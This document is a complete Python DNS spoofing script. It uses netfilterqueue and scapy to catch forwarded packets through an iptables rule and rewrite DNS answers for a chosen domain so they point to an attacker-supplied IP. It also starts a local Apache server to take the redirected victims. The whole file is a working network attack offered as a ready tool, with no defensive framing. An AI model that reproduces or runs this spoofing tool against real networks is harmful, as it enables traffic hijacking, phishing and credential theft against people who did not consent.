#!/usr/bin/evn python

import netfilterqueue
import scapy.all as scapy
import optparse
import os, time, sys

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-d", "--domain-name", dest="domain_name", help="Domain name for spoofing IP.")
    parser.add_option("-i", "--spoof-ip", dest="spoof_ip", help="Spoof IP to Redirect target.")
    (options, argument) = parser.parse_args()
    if not options.domain_name:
        parser.error("[-] Please specify an domain_name, use --help for more info.")
    elif not options.spoof_ip:
        parser.error("[-] Please specify an spoof_ip, use --help for more info.")
    return options

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        domain = options.domain_name.encode()
        ip = options.spoof_ip.encode()
        if domain in qname:
            print("\r\033[0;32;40m[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

options = get_arguments()
queue = netfilterqueue.NetfilterQueue()

try:
    print("\n\033[0;31;40m[-] Exit from This Proocess to Press CTRL + C\n")
    print("\n\033[0;32;40m[+] Setting IP tables... \n\n\033[0;32;40m[+] Starting Local server...\n")
    os.system('sudo service apache2 start')
    os.system('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0')
    print("\033[0;33;40m[+] Spoofed Target Domain Name : \033[0;32;40m" + str(options.domain_name) + "\n")
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("\n\n\033[0;33;40m[+] Detected CTRL + C ...")

except :
    print("\n\n\033[0;33;40m[+] Some Error Occurred, Please Try Again ...")
    
finally:
    print("\n\033[0;33;40m[+] Resetting IP tables... \n\n\033[0;33;40m[+] Stoping Local server... \n\n\033[0;31;40m[-] Exit from This proocess.\n")
    queue.unbind()
    time.sleep(1)
    os.system('sudo iptables --flush')
    time.sleep(1)
    os.system('sudo service apache2 stop')
    time.sleep(1)
    os.system('exit')
